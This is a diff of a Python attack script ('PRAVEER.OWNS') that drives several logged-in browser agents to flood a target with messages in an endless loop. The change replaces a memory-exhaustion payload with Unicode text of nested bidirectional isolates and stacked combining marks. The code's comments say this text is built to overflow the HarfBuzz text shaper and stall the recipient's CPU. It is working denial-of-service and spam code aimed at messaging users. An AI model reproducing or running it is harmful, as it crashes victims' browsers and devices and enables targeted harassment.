@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (ENTROPY-STORM V77)
-# 📅 STATUS: RAM-FRAGMENTATION-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (ARCHITECTURAL-VOID V78)
+# 📅 STATUS: HARFBUZZ-CRASH-ACTIVE | 4-AGENT TOTAL | AWS-CPU-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -20,23 +20,28 @@ GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_entropy_storm_payload():
-    """Generates unique, high-entropy data to shatter browser memory management."""
-    u_id = random.randint(1000, 9999)
-    # High-plane characters (4 bytes) that force unique memory allocation
-    # 𒀱 = Cuneiform | ﷽ = Wide Ligature | 𒈙 = Complexity
-    heavy_pool = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "🌙", "👑", "𝕻", "𝕬", "𝕰", "𝕽"]
+def get_void_payload():
+    """Generates mathematically 'unstable' layout that forces C++ context switches."""
+    u_id = random.randint(100, 999)
+    
+    # \u2066 = LRI | \u2067 = RLI | \u2069 = PDI (Recursive Isolates)
+    # \u034F = CGJ (Combining Grapheme Joiner)
+    # Stacking Marks - 120 deep to exceed the HarfBuzz buffer
+    lri, rli, pdi, cgj = "\u2066", "\u2067", "\u2069", "\u034F"
+    marks = "".join([chr(i) for i in range(0x0300, 0x036F)]) 
     glue = "\u2060" # Word Joiner
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STORM_ID:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [VOID_LOCK:{u_id}]"
     
     body = []
-    # 450 lines of unique, non-compressible memory blocks
+    # 450 lines - Saturating the 10,000 character socket buffer
     for i in range(450):
-        # Shuffling ensures the browser cannot 'intern' the string.
-        # Every message is a fresh 10KB memory allocation.
-        random.shuffle(heavy_pool)
-        line = f"PRAVEER PAPA {''.join(heavy_pool * 5)} {i}{glue*4}"
+        # We alternate direction for EVERY character within a deep nest.
+        # This prevents the browser from using 'Run-Segment' optimization.
+        # It forces the CPU to re-check the BiDi stack 200+ times per line.
+        nest = f"{lri}{rli}{lri}"
+        content = f"P{marks}{cgj}R{marks}{cgj}A{marks}{cgj}V{marks}{cgj}EER{cgj}"
+        line = f"{nest}{content}{pdi*3} 🌙 {i}{glue*5}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -89,13 +94,13 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_entropy_storm_payload()
+                payload = get_void_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Storm-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Void-Strike ({GLOBAL_SENT})")
                     
                     if strike_count % 100 == 0:
                         driver.refresh()
